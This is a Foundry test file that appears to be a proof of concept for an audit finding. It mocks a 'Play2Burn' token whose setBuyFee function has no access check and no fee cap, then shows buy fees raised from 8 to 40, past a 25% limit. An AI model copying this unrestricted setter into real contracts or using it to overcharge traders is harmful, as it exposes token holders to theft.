// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";

contract MockWETH {}

contract MockFactory {
    function createPair(address, address) external returns (address) {
        return address(0x1234567890123456789012345678901234567890);
    }
}

contract MockRouter {
    address public factory;
    address public WETH;
}

contract Play2Burn {
    struct FeeStructure {
        uint16 liquidityFee;
        uint16 marketingFee;
        uint16 rewardFee;
        uint16 taxFee;
    }
    
    FeeStructure public buyFee;
    FeeStructure public sellFee;
    address public owner;

    constructor() {
        owner = msg.sender;
        // Fee initialization
        buyFee.liquidityFee = 3;
        buyFee.marketingFee = 2;
        buyFee.rewardFee = 1;
        buyFee.taxFee = 2;

        sellFee.liquidityFee = 5;
        sellFee.marketingFee = 2;
        sellFee.rewardFee = 2;
        sellFee.taxFee = 3;
        
        // Skip Uniswap setup for test purposes
    }

    function setBuyFee(uint16 liq, uint16 market, uint16 reward, uint16 tax) external {
        buyFee.liquidityFee = liq;
        buyFee.marketingFee = market;
        buyFee.rewardFee = reward;
        buyFee.taxFee = tax;
    }
}

contract Play2BurnFeeManipulationTest is Test {
    Play2Burn token;
    address owner = address(0x1234);
    address constant PREDEFINED_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function setUp() public {
        vm.startPrank(owner);
        // Deploy mock contracts
        address mockWETH = address(new MockWETH());
        address mockFactory = address(new MockFactory());
        
        // Set up mock router
        bytes memory routerCode = type(MockRouter).creationCode;
        vm.etch(PREDEFINED_ROUTER, routerCode);
        
        // Set router storage: factory at slot 0
        vm.store(
            PREDEFINED_ROUTER,
            bytes32(0), 
            bytes32(uint256(uint160(mockFactory)))
        );
        // Set router storage: WETH at slot 1
        vm.store(
            PREDEFINED_ROUTER,
            bytes32(uint256(1)), 
            bytes32(uint256(uint160(mockWETH)))
        );
        
        // Deploy token contract
        token = new Play2Burn();
        vm.stopPrank();
    }

    function test_FeeManipulation() public {
        uint16 highLiq = 10;
        uint16 highMarket = 10;
        uint16 highReward = 10;
        uint16 highTax = 10;
        uint256 totalFee = uint256(highLiq) + highMarket + highReward + highTax;

        // BEFORE: Get original fee state
        (uint16 origLiq, uint16 origMarket, uint16 origReward, uint16 origTax) = token.buyFee();
        uint16 origTotal = origLiq + origMarket + origReward + origTax;
        console2.log("--- BEFORE-Trigger State ---");
        console2.log("buyFee liquidityFee:", origLiq);
        console2.log("buyFee marketingFee:", origMarket);
        console2.log("buyFee rewardFee:", origReward);
        console2.log("buyFee taxFee:", origTax);
        console2.log("Total fee pre-attack:", origTotal, "(expected <=25%)");

        console2.log("--- Trigger: setBuyFee(10,10,10,10) ---");
        // Owner sets malicious fees (40% total)
        vm.prank(owner);
        token.setBuyFee(highLiq, highMarket, highReward, highTax);

        // AFTER: Get modified fee state
        (uint16 newLiq, uint16 newMarket, uint16 newReward, uint16 newTax) = token.buyFee();
        uint16 newTotal = newLiq + newMarket + newReward + newTax;
        console2.log("--- AFTER-Trigger State ---");
        console2.log("buyFee liquidityFee:", newLiq);
        console2.log("buyFee marketingFee:", newMarket);
        console2.log("buyFee rewardFee:", newReward);
        console2.log("buyFee taxFee:", newTax);
        console2.log("Total fee post-attack:", newTotal);

        // Compare values
        console2.log("--- Verification ---");
        console2.log("Orig total (8%%?) vs New total (40%%?):", origTotal, "->", newTotal);
        bool feeChanged = newTotal > origTotal;
        bool feeCapViolated = newTotal > 25;
        console2.log("Fee increased?", feeChanged ? "YES" : "NO");
        console2.log("Fee cap violated?", feeCapViolated ? "YES" : "NO");

        // Final verdict
        if (feeCapViolated) {
            console2.log("Vulnerability Exists: Fee cap can be bypassed (40%>25%)");
        } else {
            console2.log("Vulnerability not Exist: Fee cap enforced");
        }
    }
}